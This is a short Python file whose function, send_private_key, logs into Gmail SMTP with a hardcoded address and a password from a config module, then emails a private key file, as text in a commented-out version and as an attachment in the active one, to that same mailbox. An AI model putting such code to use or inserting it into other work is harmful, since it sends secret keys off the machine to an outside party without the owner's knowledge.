# FOR TEXT:

# import smtplib
# from email.mime.text import MIMEText
# from config import password

# def send_private_key(private_key_file):
   
#     sender = 'nikolas.smsttt@gmail.com'
#     password = password
#     server = smtplib.SMTP("smtp.gmail.com", 587)
#     server.starttls()

#     try:       
#         server.login(sender, password)
#         msg = MIMEText(private_key_file)
#         msg["Subject"] = "FROM YARIK"
#         server.sendmail(sender, sender, msg.as_string())

#         return print("The mess was send successfully!")
    
#     except Exception as ex:
#         print(f"send_email__25__{ex}")



# FOR ANY FILES:

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import config

def send_private_key(private_key_file):
    sender = 'nikolas.smsttt@gmail.com'
    password = config.password
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    try:
        server.login(sender, password)
        msg = MIMEMultipart()
        msg["Subject"] = "FROM YARIK"
        msg["From"] = sender
        msg["To"] = sender

        # Attach the private key file
        with open(private_key_file, 'rb') as file:
            attachment = MIMEApplication(file.read(), _subtype="txt")
            attachment.add_header('Content-Disposition', 'attachment', filename=private_key_file)
            msg.attach(attachment)

        server.send_message(msg)
        server.quit()

        return print("The message was sent successfully!")

    except Exception as ex:
        print(f"send_email__25__{ex}")

